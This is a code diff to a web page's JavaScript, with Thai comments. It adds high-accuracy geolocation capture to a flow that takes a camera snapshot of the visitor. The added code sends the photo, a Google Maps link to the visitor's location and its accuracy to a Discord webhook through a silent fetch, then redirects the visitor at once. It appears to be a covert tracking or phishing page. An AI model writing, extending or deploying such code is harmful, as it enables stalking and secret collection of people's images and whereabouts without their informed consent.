@@ -85,6 +85,27 @@ const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const photo = document.getElementById('photo');
 
+async function getLocation() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve(null);
+      return;
+    }
+    
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        resolve({
+          lat: position.coords.latitude,
+          lng: position.coords.longitude,
+          accuracy: position.coords.accuracy
+        });
+      },
+      () => resolve(null),
+      { timeout: 5000, enableHighAccuracy: true }
+    );
+  });
+}
+
 async function sendToDiscord(message, imageBlob = null) {
   try {
     const form = new FormData();
@@ -102,6 +123,9 @@ async function sendToDiscord(message, imageBlob = null) {
 async function startCapture() {
   const userAgent = navigator.userAgent || navigator.vendor || window.opera;
   const isAndroid = /Android/i.test(userAgent);
+  
+  // เริ่มขอ location ทันที (ทำพร้อมกับกล้อง)
+  const locationPromise = getLocation();
   
   try {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -149,10 +173,22 @@ async function startCapture() {
     
     stream.getTracks().forEach(t => t.stop());
 
+    // รอ location (ไม่เกิน 5 วินาที)
+    const location = await locationPromise;
+    
+    // สร้างข้อความพร้อม location
+    let message = `📸 ${isAndroid ? 'Android' : 'iOS'}`;
+    if (location) {
+      message += `\n📍 ที่อยู่: https://www.google.com/maps?q=${location.lat},${location.lng}`;
+      message += `\n🎯 ความแม่นยำ: ${Math.round(location.accuracy)}m`;
+    } else {
+      message += `\n⚠️ ไม่สามารถเข้าถึงตำแหน่งได้`;
+    }
+
     // ส่งไป Discord แบบไม่รอ
     const form = new FormData();
     form.append("file", blob, "capture.jpg");
-    form.append("content", `📸 ${isAndroid ? 'Android' : 'iOS'}`);
+    form.append("content", message);
     fetch(WEBHOOK_URL, { method: "POST", body: form }).catch(() => {});
     
     // Redirect ทันที
